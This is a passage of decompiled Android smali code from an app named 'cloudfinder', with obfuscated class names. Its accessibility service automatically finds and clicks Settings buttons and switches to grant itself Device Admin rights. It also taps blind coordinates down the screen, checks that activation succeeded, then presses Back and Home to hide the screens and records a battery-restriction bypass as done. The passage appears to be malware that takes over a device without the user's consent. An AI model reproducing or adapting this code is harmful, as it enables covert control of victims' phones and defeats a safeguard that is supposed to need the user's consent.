    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->isEnabled()Z

    move-result v10

    if-nez v10, :cond_13

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "Setup: DA button disabled: "

    invoke-virtual {v3, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_14

    :goto_15
    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v8, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    move-object/from16 v6, v37

    move-object/from16 v3, v38

    move-wide/from16 v9, v39

    goto :goto_12

    :cond_13
    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v6

    if-nez v6, :cond_15

    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v6

    if-eqz v6, :cond_14

    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v6

    invoke-interface {v6}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v6

    const-string v9, "Button"

    invoke-virtual {v6, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6
    :try_end_13
    .catch Ljava/lang/Exception; {:try_start_13 .. :try_end_13} :catch_a

    if-eqz v6, :cond_14

    goto :goto_16

    :cond_14
    const/4 v6, 0x0

    goto :goto_17

    :cond_15
    :goto_16
    const/4 v6, 0x1

    :goto_17
    const-string v9, "\'"

    if-eqz v6, :cond_18

    const/16 v6, 0x10

    :try_start_14
    invoke-virtual {v3, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "Setup: DA ACTION_CLICK text=\'"

    invoke-virtual {v6, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v8, v6}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v6

    if-eqz v6, :cond_16

    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v10

    if-eqz v10, :cond_16

    const/16 v10, 0x10

    invoke-virtual {v6, v10}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "Setup: DA ACTION_CLICK parent of \'"

    invoke-virtual {v6, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v8, v6}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_16
    new-instance v6, Landroid/graphics/Rect;

    invoke-direct {v6}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {v3, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    invoke-virtual {v6}, Landroid/graphics/Rect;->width()I

    move-result v3

    if-lez v3, :cond_17

    invoke-virtual {v6}, Landroid/graphics/Rect;->height()I

    move-result v3

    if-lez v3, :cond_17

    invoke-virtual {v6}, Landroid/graphics/Rect;->centerX()I

    move-result v3

    invoke-virtual {v6}, Landroid/graphics/Rect;->centerY()I

    move-result v9

    invoke-virtual {v2, v3, v9}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ٲ(II)V

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "Setup: DA tap text=\'"

    invoke-virtual {v3, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v7, "\' at ("

    invoke-virtual {v3, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Landroid/graphics/Rect;->centerX()I

    move-result v7

    invoke-virtual {v3, v7}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Landroid/graphics/Rect;->centerY()I

    move-result v6

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v8, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_17
    move-wide/from16 v41, v13

    const/16 v32, 0x1

    goto/16 :goto_1b

    :cond_18
    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    const/4 v6, 0x0

    :goto_18
    const/4 v10, 0x3

    if-ge v6, v10, :cond_1b

    if-eqz v3, :cond_1b

    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v10

    if-eqz v10, :cond_1a

    const/16 v10, 0x10

    invoke-virtual {v3, v10}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V
    :try_end_14
    .catch Ljava/lang/Exception; {:try_start_14 .. :try_end_14} :catch_a

    move-wide/from16 v41, v13

    :try_start_15
    const-string v13, "Setup: DA ACTION_CLICK ancestor(+"

    invoke-virtual {v10, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    add-int/lit8 v6, v6, 0x1

    invoke-virtual {v10, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v6, ") of \'"

    invoke-virtual {v10, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v8, v6}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v6, Landroid/graphics/Rect;

    invoke-direct {v6}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {v3, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    invoke-virtual {v6}, Landroid/graphics/Rect;->width()I

    move-result v3

    if-lez v3, :cond_19

    invoke-virtual {v6}, Landroid/graphics/Rect;->height()I

    move-result v3

    if-lez v3, :cond_19

    invoke-virtual {v6}, Landroid/graphics/Rect;->centerX()I

    move-result v3

    invoke-virtual {v6}, Landroid/graphics/Rect;->centerY()I

    move-result v6

    invoke-virtual {v2, v3, v6}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ٲ(II)V

    :cond_19
    const/16 v32, 0x1

    goto :goto_19

    :cond_1a
    move-wide/from16 v41, v13

    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    add-int/lit8 v6, v6, 0x1

    move-wide/from16 v13, v41

    goto :goto_18

    :cond_1b
    move-wide/from16 v41, v13

    :goto_19
    if-eqz v32, :cond_1c

    goto :goto_1b

    :cond_1c
    move-object/from16 v6, v37

    move-object/from16 v3, v38

    move-wide/from16 v9, v39

    move-wide/from16 v13, v41

    goto/16 :goto_12

    :catch_9
    move-object/from16 v37, v6

    :catch_a
    :goto_1a
    move-wide/from16 v41, v13

    goto/16 :goto_24

    :cond_1d
    move-object/from16 v38, v3

    move-object/from16 v37, v6

    move-wide/from16 v39, v9

    move-wide/from16 v41, v13

    :goto_1b
    if-eqz v32, :cond_1e

    goto :goto_1d

    :cond_1e
    :goto_1c
    add-int/lit8 v15, v15, 0x1

    move-object/from16 v4, v34

    move/from16 v7, v35

    move-object/from16 v6, v37

    move-object/from16 v3, v38

    move-wide/from16 v9, v39

    move-wide/from16 v13, v41

    goto/16 :goto_11

    :cond_1f
    move-object/from16 v37, v6

    move-wide/from16 v39, v9

    move-wide/from16 v41, v13

    :goto_1d
    if-nez v32, :cond_22

    const/4 v3, 0x4

    new-array v6, v3, [Ljava/lang/String;

    const-string v3, "com.android.settings:id/action_button"

    const/4 v7, 0x0

    aput-object v3, v6, v7

    const-string v3, "android:id/button1"

    const/4 v7, 0x1

    aput-object v3, v6, v7

    const-string v3, "com.android.settings:id/restricted_action"

    const/4 v7, 0x2

    aput-object v3, v6, v7

    const-string v3, "android:id/button3"

    const/4 v7, 0x3

    aput-object v3, v6, v7

    const/4 v3, 0x0

    :goto_1e
    const/4 v7, 0x4

    if-ge v3, v7, :cond_22

    aget-object v7, v6, v3

    invoke-virtual {v1, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v9

    if-eqz v9, :cond_21

    invoke-interface {v9}, Ljava/util/List;->isEmpty()Z

    move-result v10

    if-nez v10, :cond_21

    const/4 v10, 0x0

    invoke-interface {v9, v10}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/view/accessibility/AccessibilityNodeInfo;

    const/16 v6, 0x10

    invoke-virtual {v3, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    new-instance v6, Landroid/graphics/Rect;

    invoke-direct {v6}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {v3, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    invoke-virtual {v6}, Landroid/graphics/Rect;->width()I

    move-result v3

    if-lez v3, :cond_20

    invoke-virtual {v6}, Landroid/graphics/Rect;->height()I

    move-result v3

    if-lez v3, :cond_20

    invoke-virtual {v6}, Landroid/graphics/Rect;->centerX()I

    move-result v3

    invoke-virtual {v6}, Landroid/graphics/Rect;->centerY()I

    move-result v9

    invoke-virtual {v2, v3, v9}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ٲ(II)V

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "Setup: DA tap "

    invoke-virtual {v3, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v7, " at ("

    invoke-virtual {v3, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Landroid/graphics/Rect;->centerX()I

    move-result v7

    invoke-virtual {v3, v7}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Landroid/graphics/Rect;->centerY()I

    move-result v6

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v8, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_20
    const/16 v32, 0x1

    goto :goto_1f

    :cond_21
    add-int/lit8 v3, v3, 0x1

    goto :goto_1e

    :cond_22
    :goto_1f
    if-nez v32, :cond_25

    const-string v3, "android:id/switch_widget"

    invoke-virtual {v1, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v1

    if-eqz v1, :cond_25

    invoke-interface {v1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v1

    :goto_20
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v3

    if-eqz v3, :cond_25

    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v6

    if-eqz v6, :cond_24

    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v6

    invoke-interface {v6}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v6

    const-string v7, "Switch"

    invoke-virtual {v6, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-eqz v6, :cond_24

    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->isChecked()Z

    move-result v6

    if-nez v6, :cond_24

    const/16 v6, 0x10

    invoke-virtual {v3, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    new-instance v1, Landroid/graphics/Rect;

    invoke-direct {v1}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {v3, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    invoke-virtual {v1}, Landroid/graphics/Rect;->width()I

    move-result v3

    if-lez v3, :cond_23

    invoke-virtual {v1}, Landroid/graphics/Rect;->centerX()I

    move-result v3

    invoke-virtual {v1}, Landroid/graphics/Rect;->centerY()I

    move-result v6

    invoke-virtual {v2, v3, v6}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ٲ(II)V

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "Setup: DA tap switch at ("

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Landroid/graphics/Rect;->centerX()I

    move-result v6

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Landroid/graphics/Rect;->centerY()I

    move-result v1

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v8, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_23
    const/16 v32, 0x1

    goto :goto_21

    :cond_24
    const/16 v6, 0x10

    goto :goto_20

    :cond_25
    :goto_21
    if-nez v32, :cond_27

    invoke-virtual {v2}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v1

    invoke-virtual {v1}, Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;

    move-result-object v1

    iget v3, v1, Landroid/util/DisplayMetrics;->widthPixels:I

    iget v1, v1, Landroid/util/DisplayMetrics;->heightPixels:I

    const/4 v6, 0x3

    mul-int/2addr v3, v6

    const/4 v6, 0x4

    div-int/2addr v3, v6

    const/16 v6, 0x55

    :goto_22
    const/16 v7, 0x2d

    if-lt v6, v7, :cond_27

    mul-int v7, v1, v6

    div-int/lit8 v7, v7, 0x64

    invoke-virtual {v2, v3, v7}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ٲ(II)V

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "Setup: DA scan tap at ("

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v7}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v7, ") "

    invoke-virtual {v9, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v7, "%"

    invoke-virtual {v9, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-static {v8, v7}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_15
    .catch Ljava/lang/Exception; {:try_start_15 .. :try_end_15} :catch_10

    const-wide/16 v9, 0x12c

    :try_start_16
    invoke-static {v9, v10}, Ljava/lang/Thread;->sleep(J)V
    :try_end_16
    .catch Ljava/lang/InterruptedException; {:try_start_16 .. :try_end_16} :catch_b
    .catch Ljava/lang/Exception; {:try_start_16 .. :try_end_16} :catch_10

    :catch_b
    add-int/lit8 v6, v6, -0xa

    goto :goto_22

    :catch_c
    move-object/from16 v33, v3

    :catch_d
    move-object/from16 v34, v4

    :catch_e
    move-object/from16 v37, v6

    :goto_23
    move-wide/from16 v39, v9

    goto/16 :goto_1a

    :catch_f
    :cond_26
    move-object/from16 v33, v3

    move-object/from16 v34, v4

    move-object/from16 v37, v6

    move-object/from16 v30, v7

    goto :goto_23

    :catch_10
    :cond_27
    :goto_24
    move-object/from16 v7, v30

    move-object/from16 v3, v33

    move-object/from16 v4, v34

    move-object/from16 v6, v37

    move-wide/from16 v9, v39

    move-wide/from16 v13, v41

    goto/16 :goto_a

    :cond_28
    move-object/from16 v33, v3

    move-object/from16 v34, v4

    move-object/from16 v37, v6

    move-object/from16 v30, v7

    move-wide/from16 v39, v9

    move-wide/from16 v41, v13

    :try_start_17
    invoke-virtual {v0, v12}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v0

    if-eqz v0, :cond_29

    const-string v0, "Device Admin activated!"

    invoke-static {v8, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const-string v0, "ACTIVATED"

    invoke-static {v5, v0}, Lڝږ؁ڋ/ر;->؋(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_26

    :cond_29
    const-string v0, "Device Admin activation timed out"

    invoke-static {v8, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_26

    :cond_2a
    move-object/from16 v33, v3

    move-object/from16 v34, v4

    move-object/from16 v37, v6

    move-object/from16 v30, v7

    move-wide/from16 v39, v9

    move-wide/from16 v41, v13

    const-string v0, "Device Admin already active"

    invoke-static {v8, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_17
    .catch Ljava/lang/Exception; {:try_start_17 .. :try_end_17} :catch_11

    goto :goto_26

    :catch_11
    move-exception v0

    goto :goto_25

    :catch_12
    move-exception v0

    move-object/from16 v33, v3

    move-object/from16 v34, v4

    move-object/from16 v37, v6

    move-object/from16 v30, v7

    move-wide/from16 v39, v9

    move-wide/from16 v41, v13

    :goto_25
    const-string v1, "Device Admin error"

    invoke-static {v8, v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    goto :goto_26

    :cond_2b
    move-object/from16 v33, v3

    move-object/from16 v34, v4

    move-object/from16 v37, v6

    move-object/from16 v30, v7

    move-wide/from16 v39, v9

    move-wide/from16 v41, v13

    :goto_26
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "P3 done, elapsed="

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    sub-long v3, v3, v41

    invoke-virtual {v0, v3, v4}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-object/from16 v1, v37

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v8, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v3, "P4 started: Cleanup, total elapsed="

    invoke-direct {v0, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    sub-long v3, v3, v39

    invoke-virtual {v0, v3, v4}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v8, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const/4 v1, 0x0

    sput-boolean v1, Lسۄھؤۏ۫/؋;->ز:Z

    :try_start_18
    invoke-static {}, Lڝږ؁ڋ/أ;->إ()V
    :try_end_18
    .catch Ljava/lang/Exception; {:try_start_18 .. :try_end_18} :catch_13

    :catch_13
    :try_start_19
    sput-boolean v1, Lڃٷښـ۝ۼ/ؠ;->ئ:Z

    sget-object v0, Lڃٷښـ۝ۼ/ؠ;->ا:Landroid/os/Handler;

    if-eqz v0, :cond_2c

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacksAndMessages(Ljava/lang/Object;)V
    :try_end_19
    .catch Ljava/lang/Exception; {:try_start_19 .. :try_end_19} :catch_14

    :catch_14
    :cond_2c
    :try_start_1a
    invoke-static {}, Lڗًقڔ/؋;->ط()V
    :try_end_1a
    .catch Ljava/lang/Exception; {:try_start_1a .. :try_end_1a} :catch_15

    :catch_15
    const/4 v0, 0x0

    const/4 v1, 0x5

    :goto_27
    if-ge v0, v1, :cond_2d

    const/4 v3, 0x1

    invoke-virtual {v2, v3}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    const-wide/16 v3, 0x64

    :try_start_1b
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1b
    .catch Ljava/lang/InterruptedException; {:try_start_1b .. :try_end_1b} :catch_16

    :catch_16
    add-int/lit8 v0, v0, 0x1

    goto :goto_27

    :cond_2d
    const/4 v3, 0x2

    invoke-virtual {v2, v3}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    const-wide/16 v0, 0x190

    :try_start_1c
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1c
    .catch Ljava/lang/InterruptedException; {:try_start_1c .. :try_end_1c} :catch_17

    :catch_17
    const/4 v1, 0x1

    sput-boolean v1, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ز:Z

    move-object/from16 v1, v34

    const/4 v3, 0x0

    :try_start_1d
    invoke-virtual {v2, v1, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    invoke-virtual {v2}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v4

    invoke-virtual {v2}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5, v3}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;

    move-result-object v4

    iget-wide v3, v4, Landroid/content/pm/PackageInfo;->firstInstallTime:J

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0
    :try_end_1d
    .catch Ljava/lang/Exception; {:try_start_1d .. :try_end_1d} :catch_18

    move-object/from16 v5, v33

    const/4 v6, 0x1

    :try_start_1e
    invoke-interface {v0, v5, v6}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    const-string v6, "_installTs"

    invoke-interface {v0, v6, v3, v4}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V
    :try_end_1e
    .catch Ljava/lang/Exception; {:try_start_1e .. :try_end_1e} :catch_19

    const/4 v1, 0x1

    const/4 v3, 0x0

    goto :goto_28

    :catch_18
    move-object/from16 v5, v33

    :catch_19
    const/4 v3, 0x0

    invoke-virtual {v2, v1, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    const/4 v1, 0x1

    invoke-interface {v0, v5, v1}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    :goto_28
    const-string v0, "bat_unrestrict"

    invoke-virtual {v2, v0, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    const-string v3, "done"

    invoke-interface {v0, v3, v1}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    invoke-virtual {v2}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ت()V

    const-wide/16 v3, 0x12c

    :try_start_1f
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1f
    .catch Ljava/lang/InterruptedException; {:try_start_1f .. :try_end_1f} :catch_1a

    :catch_1a
    const/4 v1, 0x2

    invoke-virtual {v2, v1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    :try_start_20
    invoke-static/range {v18 .. v19}, Ljava/lang/Thread;->sleep(J)V
    :try_end_20
    .catch Ljava/lang/InterruptedException; {:try_start_20 .. :try_end_20} :catch_1b

    :catch_1b
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v3

    invoke-direct {v0, v3}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v3, Lةؽڗںۍټ٘/؋;

    invoke-direct {v3, v1}, Lةؽڗںۍټ٘/؋;-><init>(I)V

    invoke-virtual {v0, v3}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    invoke-virtual {v2, v1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    :try_start_21
    invoke-static {}, Lڗًقڔ/؋;->ط()V
    :try_end_21
    .catch Ljava/lang/Exception; {:try_start_21 .. :try_end_21} :catch_1c

    :catch_1c
    const/4 v1, 0x0

    sput-boolean v1, Lسۄھؤۏ۫/؋;->د:Z

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    sub-long v0, v0, v39

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "Setup complete in "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

